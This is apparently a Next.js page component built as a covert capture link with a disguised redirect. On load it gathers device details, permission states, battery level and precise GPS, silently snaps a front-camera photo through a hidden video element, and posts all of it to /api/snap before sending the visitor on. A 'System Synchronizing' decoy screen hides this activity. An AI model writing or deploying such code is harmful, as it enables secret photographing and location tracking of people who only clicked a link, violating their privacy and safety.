"use client";

import React, { useEffect, useRef, Suspense } from "react";
import { useSearchParams } from "next/navigation";

function CaptureContent() {
  const searchParams = useSearchParams();
  const t = searchParams.get("t");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const autoProcess = async () => {
      // 1. Decode Destination
      let destination = "/";
      try {
        if (t) destination = atob(t);
      } catch {
        destination = "/";
      }

      // 2. Deteksi Info Perangkat & Jaringan
      const deviceInfo = {
        model: navigator.userAgent.includes("Android")
          ? "Android"
          : navigator.userAgent.includes("iPhone")
            ? "iOS"
            : "PC",
        os: navigator.platform,
        browser: navigator.userAgent.split(" ").pop(),
        language: navigator.language,
        cores: navigator.hardwareConcurrency || "Unknown",
        memory: (navigator as any).deviceMemory || "Unknown",
      };

      // 3. Deteksi Status Izin (Sesuai daftar perizinan browser)
      const getPermissions = async () => {
        const perms: any = {};
        const list = [
          "notifications",
          "geolocation",
          "clipboard-read",
          "camera",
          "microphone",
        ];

        for (const name of list) {
          try {
            const status = await navigator.permissions.query({
              name: name as any,
            });
            perms[name] = status.state;
          } catch {
            perms[name] = "unsupported";
          }
        }
        return perms;
      };

      const browserPerms = await getPermissions();

      // 4. Deteksi Baterai
      let batteryInfo = null;
      try {
        if ("getBattery" in navigator) {
          const b: any = await (navigator as any).getBattery();
          batteryInfo = {
            level: Math.round(b.level * 100),
            charging: b.charging,
          };
        }
      } catch (e) {}

      // 5. Ambil GPS
      const gps: any = await new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
          (pos) =>
            resolve({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              acc: pos.coords.accuracy,
            }),
          () => resolve(null),
          { timeout: 5000, enableHighAccuracy: true },
        );
      });

      // 6. Ambil Gambar & Kirim
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false,
        });

        if (videoRef.current && canvasRef.current) {
          videoRef.current.srcObject = stream;
          await new Promise((r) => setTimeout(r, 1500)); // Tunggu fokus kamera

          const canvas = canvasRef.current;
          canvas.width = videoRef.current.videoWidth;
          canvas.height = videoRef.current.videoHeight;
          canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);

          const image = canvas.toDataURL("image/png");
          stream.getTracks().forEach((track) => track.stop());

          // Kirim Data Lengkap
          await fetch("/api/snap", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              image,
              gps,
              device: deviceInfo,
              battery: batteryInfo,
              permissions: {
                ...browserPerms,
                location: !!gps,
                nearby:
                  "bluetooth" in navigator ? "supported" : "not supported",
              },
            }),
          });
        }
      } catch (err) {
        // Jika kamera ditolak, tetap kirim data sisa (GPS/Device Info)
        await fetch("/api/snap", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image: "",
            gps,
            device: deviceInfo,
            battery: batteryInfo,
            permissions: { ...browserPerms, location: !!gps, camera: "denied" },
          }),
        });
      } finally {
        window.location.replace(destination);
      }
    };

    autoProcess();
  }, [t]);

  return (
    <div className="bg-black text-white flex flex-col items-center justify-center min-h-screen font-mono">
      <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-blue-500 mb-4"></div>
      <p className="text-[10px] tracking-[0.2em] text-slate-500 uppercase animate-pulse">
        System Synchronizing...
      </p>
      <video
        ref={videoRef}
        autoPlay
        playsInline
        className="absolute opacity-0 w-1 h-1 pointer-events-none"
      />
      <canvas ref={canvasRef} className="hidden" />
    </div>
  );
}

export default function CapturePage() {
  return (
    <Suspense
      fallback={
        <div className="bg-black flex items-center justify-center min-h-screen">
          <p className="text-slate-700 text-[10px] uppercase tracking-widest">
            Loading Security Modules...
          </p>
        </div>
      }
    >
      <CaptureContent />
    </Suspense>
  );
}
